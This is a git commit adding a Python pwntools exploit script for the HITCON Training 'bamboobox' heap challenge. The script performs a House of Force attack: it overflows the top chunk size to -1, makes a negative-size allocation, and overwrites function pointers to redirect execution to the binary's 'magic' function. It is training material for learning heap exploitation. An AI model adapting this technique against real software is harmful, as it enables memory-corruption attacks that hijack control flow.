6e9c5bc62622ea1f35687a26ec9ecba601c7cf07
0x01f <aboultraman@gmail.com>
2018-07-22 20:30:57 +0800

    unlink or hof

---
+++ hitconTraining_unlink/hof_func_ptr.py
@@ -0,0 +1,42 @@
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+__Auther__ = 'M4x'
+
+from pwn import *
+from zio import l64
+from time import sleep
+import sys
+context.log_level = "debug"
+context.terminal = ["deepin-terminal", "-x", "sh", "-c"]
+
+io = process("./bamboobox")
+
+def DEBUG():
+	raw_input("DEBUG: ")
+	gdb.attach(io)
+
+
+def add(length, name):
+    io.sendlineafter(":", "2")
+    io.sendlineafter(":", str(length))
+    io.sendafter(":", name)
+
+def change(idx, length, name):
+    io.sendlineafter(":", "3")
+    io.sendlineafter(":", str(idx))
+    io.sendlineafter(":", str(length))
+    io.sendafter(":", name)
+
+def exit():
+    io.sendlineafter(":", "5")
+
+if __name__ == "__main__":
+    add(0x60, cyclic(0x60))
+    change(0, 0x60 + 0x10, cyclic(0x60) + p64(0) + l64(-1))
+    #  DEBUG()
+    add(-(0x60 + 0x10) - (0x10 + 0x10) - 0x10, 'aaaa')
+    add(0x10, p64(ELF("./bamboobox").sym['magic']) * 2)
+    exit()
+
+    io.interactive()
+    io.close()
